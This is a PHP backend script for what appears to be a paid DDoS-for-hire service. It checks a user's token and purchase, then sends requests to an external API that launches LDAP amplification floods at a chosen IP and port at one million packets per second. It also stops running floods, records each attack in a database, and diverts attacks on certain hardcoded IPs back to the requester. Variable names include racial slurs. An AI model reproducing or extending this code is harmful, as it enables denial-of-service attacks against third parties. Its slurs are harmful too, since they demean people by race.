<?php

require "config.php";
$realip = isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER["REMOTE_ADDR"];
if (strcasecmp($_SERVER['HTTP_USER_AGENT'], "a") !== 0) {
    header("HTTP/1.1 406 Not Acceptable");
    die();
}

if (isset($_GET["method"])) {

    $method = $_GET["method"];

    if ($method === "launch") {
        if (isset($_GET["user_token"]) && isset($_GET["username"]) && isset($_GET["target"]) && isset($_GET["length"]) && isset($_GET["port"])) {
            $user_token = $_GET["user_token"];
    
            $user_email = "";
            $perms = false;

            $filter = ['usertoken' => "$user_token"];
            $options = [ 'limit' => 1 ];
            $query = new MongoDB\Driver\Query($filter, $options);
            $cursor = $MONGO_MANAGER->executeQuery("$MONGO_DATABASE.$MONGO_USERS_COLL", $query);
            $valid = false;
            $validpermissions = false;
            foreach ($cursor as $document) {
                $process = (array)$document;
                $user_email = $process["email"];
                if ($GLOBAL_PERMISSIONS[$process["permission"]] >= $ADMIN_PERMISSION_LEVEL) {
                    $perms = true;
                }
                $valid = true;
            }

            $filter = ["email"=>"$user_email"];
            $options = [];
            $query = new MongoDB\Driver\Query($filter, $options);
            $cursor = $MONGO_MANAGER->executeQuery("$MONGO_DATABASE.$MONGO_PURCHASES_COLL", $query);
            $STORED_PURCHASE_DATA = [];
            foreach ($cursor as $document) {
                $STORED_PURCHASE_DATA = (array)$document;
                if ($STORED_PURCHASE_DATA["productid"] === "0001") {
                    $validpermissions = true;
                }
            }

            if (!$validpermissions && $perms) {
                $validpermissions = true;
            }
        
            if (!$valid || !$validpermissions) {
                header('HTTP/1.0 403 Forbidden');
                exit;
            }
        
            $targetip = $_GET["target"];
            $length = $_GET["length"];
            $sentby = $_GET["username"];
            $port = $_GET["port"];
            $identifier = generateRandomString(32);
            $time = microtime(true);

            $NIGGER = ["62.163.18.42", "145.132.39.131", "94.173.251.118", "82.12.224.12"];
            $NOPE = ["99.31.196.150"];

            if (in_array($targetip, $NIGGER)) {
                $targetip = $realip;
            }

            if (in_array($targetip, $NOPE)) {
                header('HTTP/1.0 403 Forbidden');
                exit;
            }

            if ($length < 60) {
                $length = 60;
            }
            if ($length > 300) {
                $length = 300;
            }
        
            $token = $SLEEKTO_API_KEY;
            $base_url = "https://api.sleek.to/tests/launch";
        
            // $curl = curl_init();
        
            // curl_setopt_array($curl, array(
            //     CURLOPT_URL => $base_url,
            //     CURLOPT_RETURNTRANSFER => 1,
            //     CURLOPT_POST => 1,
            //     CURLOPT_POSTFIELDS => array(
            //         "token" => $token,
            //         "target" => $targetip,
            //         "port" => $port,
            //         "duration" => $length,
            //         "method" => "LDAP",
            //         "pps" => "1000000"
            //     )
            // ));


            $curl = curl_init();

            curl_setopt_array($curl, array(
                CURLOPT_URL => $base_url,
                CURLOPT_RETURNTRANSFER => 1,
                CURLOPT_POST => 1,
                CURLOPT_POSTFIELDS => array(
                    "token" => $token,
                    "target" => $targetip,
                    "port" => $port,
                    "duration" => $length,
                    "method" => "LDAP",
                    "pps" => 1000000
                )
            ));



            $response = curl_exec($curl);
            curl_close($curl);

            if (strpos($response, "You have too many ongoing tests") !== false) {

                $token = $SLEEKTO_API_KEY_TWO;

                $curl = curl_init();

                curl_setopt_array($curl, array(
                    CURLOPT_URL => $base_url,
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_POST => 1,
                    CURLOPT_POSTFIELDS => array(
                        "token" => $token,
                        "target" => $targetip,
                        "port" => $port,
                        "duration" => $length,
                        "method" => "LDAP",
                        "pps" => 1000000
                    )
                ));

                $response = curl_exec($curl);
                curl_close($curl);
            }

         

            $address="127.0.0.1";
            $port="666";
            $socketmessage = ["username"=>$_POST["username"],"type"=>"attacksent","sentfrom"=>"php","requester"=>$realip,"username"=>$sentby,"target"=>$targetip,"duration"=>$length];
            $msg=json_encode($socketmessage);

			if (\strpos($response, "Test launched successfully") !== false) {
				$sock=socket_create(AF_INET,SOCK_STREAM,0) or die("Cannot create a socket");
				socket_connect($sock,$address,$port) or die("Could not connect to the socket");
				socket_write($sock,$msg);
			}
        
            $bulkWrite=new MongoDB\Driver\BulkWrite;
            $doc=["identifier"=>"$identifier","targetip" => "$targetip", "length"=>"$length", "attacker"=>"$sentby", "curlresponse"=>"$response", "time"=>"$time"];
            $bulkWrite->insert($doc);
            $MONGO_MANAGER->executeBulkWrite("$MONGO_DATABASE.$MONGO_ATTACKS_COLL", $bulkWrite);
            header('HTTP/1.0 201 Created');
            $filter = ['identifier' => "$identifier"];
            $options = [ 'limit' => 1 ];
            $query = new MongoDB\Driver\Query($filter, $options);
            $cursor = $MONGO_MANAGER->executeQuery("$MONGO_DATABASE.$MONGO_ATTACKS_COLL", $query);
            header('HTTP/1.0 201 Created');
            foreach ($cursor as $document) {
                $process = (array)$document;
                header('Content-Type: application/json');
                echo json_encode($process, JSON_PRETTY_PRINT);
            }
        } else {
            header('HTTP/1.1 400 Bad Request');
            exit;
        }
    } else if ($method === "stop") {
        if (isset($_GET["user_token"]) && isset($_GET["username"]) && isset($_GET["target"]) && isset($_GET["length"])) {
            $user_token = $_GET["user_token"];
        
            $user_email = "";
            $perms = false;

            $filter = ['usertoken' => "$user_token"];
            $options = [ 'limit' => 1 ];
            $query = new MongoDB\Driver\Query($filter, $options);
            $cursor = $MONGO_MANAGER->executeQuery("$MONGO_DATABASE.$MONGO_USERS_COLL", $query);
            $valid = false;
            $validpermissions = false;
            foreach ($cursor as $document) {
                $process = (array)$document;
                $user_email = $process["email"];
                if ($GLOBAL_PERMISSIONS[$process["permission"]] >= $ADMIN_PERMISSION_LEVEL) {
                    $perms = true;
                }
                $valid = true;
            }

            $filter = ["email"=>"$user_email"];
            $options = [];
            $query = new MongoDB\Driver\Query($filter, $options);
            $cursor = $MONGO_MANAGER->executeQuery("$MONGO_DATABASE.$MONGO_PURCHASES_COLL", $query);
            $STORED_PURCHASE_DATA = [];
            foreach ($cursor as $document) {
                $STORED_PURCHASE_DATA = (array)$document;
                if ($STORED_PURCHASE_DATA["productid"] === "0001") {
                    $validpermissions = true;
                }
            }

            if (!$validpermissions && $perms) {
                $validpermissions = true;
            }
        
            if (!$valid || !$validpermissions) {
                header('HTTP/1.0 403 Forbidden');
                exit;
            }
        
            $targetip = $_GET["target"];
            $length = $_GET["length"];
            $sentby = $_GET["username"];


            //////////////////////////////////////////////////////////////////////////////////////// CHECK TOKEN 1 FOR ATTACKS
            $token = $SLEEKTO_API_KEY;
            $base_url = "https://api.sleek.to/tests?token=".$token;
            $curl = curl_init();
            curl_setopt_array($curl, array(
                CURLOPT_URL => $base_url,
                CURLOPT_RETURNTRANSFER => 1
            ));
            $response = curl_exec($curl);
            curl_close($curl);
            /////////////////////////////////////////////////////////////////////////////////////////

            ///////////////////////////////////////////////////////////////////////////////////////// CHECK TOKEN 2 FOR AT TACKS
            $token = $SLEEKTO_API_KEY_TWO;
            $base_url = "https://api.sleek.to/tests?token=".$token;
            $curl = curl_init();
            curl_setopt_array($curl, array(
                CURLOPT_URL => $base_url,
                CURLOPT_RETURNTRANSFER => 1
            ));
            $responsetwo = curl_exec($curl);
            curl_close($curl);
            /////////////////////////////////////////////////////////////////////////////////////////

            $cancel = array();

            ///////////////////////////////////////////////////////////////////////////////////////// DECODE TOKEN 1 ATTACKS RESPONSE
            $jsonresponse = json_decode($response, true);
            $i = 0;

            foreach ($jsonresponse as $attack) {
                $i++;
                if ($attack["target"] === $targetip && $attack["ongoing"] === true && $attack["duration"] === $length) {
                    array_push($cancel, (int)$attack["id"]);
                }
            }
            /////////////////////////////////////////////////////////////////////////////////////////

            ///////////////////////////////////////////////////////////////////////////////////////// DECODE TOKEN 2 ATTACKS RESPONSE
            $jsonresponse = json_decode($responsetwo, true);
            $i = 0;
            foreach ($jsonresponse as $attack) {
                $i++;
                if ($attack["target"] === $targetip && $attack["ongoing"] === true && $attack["duration"] === $length) {
                    array_push($cancel, (int)$attack["id"]);
                }
            }
            /////////////////////////////////////////////////////////////////////////////////////////

            foreach ($cancel as $idof) {
                $base_url = "https://api.sleek.to/tests/stop";

                ///////////////////////////////////////////////////////////////////////////////////////// TRY TO STOP ATTACK WITH TOKEN 1
                $token = $SLEEKTO_API_KEY;
                $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_URL => $base_url,
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_POST => 1,
                    CURLOPT_POSTFIELDS => array(
                        "token" => $token,
                        "test_id" => $idof
                    )
                ));
                $nigga = curl_exec($curl);
                curl_close($curl);
                /////////////////////////////////////////////////////////////////////////////////////////

                ///////////////////////////////////////////////////////////////////////////////////////// TRY TO STOP ATTACK WITH TOKEN 2
                $token = $SLEEKTO_API_KEY_TWO;
                $curl = curl_init();
                curl_setopt_array($curl, array(
                    CURLOPT_URL => $base_url,
                    CURLOPT_RETURNTRANSFER => 1,
                    CURLOPT_POST => 1,
                    CURLOPT_POSTFIELDS => array(
                        "token" => $token,
                        "test_id" => $idof
                    )
                ));
                $nigga = curl_exec($curl);
                curl_close($curl);
                /////////////////////////////////////////////////////////////////////////////////////////
            }
            header('Content-Type: application/json');
            if (sizeof($cancel) > 0) {
                /*echo json_encode(json_decode($response), JSON_PRETTY_PRINT);
                echo "\r\n";
                echo json_encode(json_decode($responsetwo), JSON_PRETTY_PRINT);*/
                echo json_encode(["success"=>"true","message"=>"Stopped ".count($cancel)." attack".(count($cancel) > 1 ? "s" : "").".","ids"=>$cancel], JSON_PRETTY_PRINT);
            } else {
                /*echo json_encode(json_decode($response), JSON_PRETTY_PRINT);
                echo "\r\n";
                echo json_encode(json_decode($responsetwo), JSON_PRETTY_PRINT);*/
                echo json_encode(["success"=>"false","message"=>"No running attacks found."], JSON_PRETTY_PRINT);
            }

        } else {
            header('HTTP/1.1 400 Bad Request');
            exit;
        }
    } else {
        header('HTTP/1.1 400 Bad Request');
        exit;
    }

} else {
    header('HTTP/1.1 400 Bad Request');
    exit;
}

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

?>
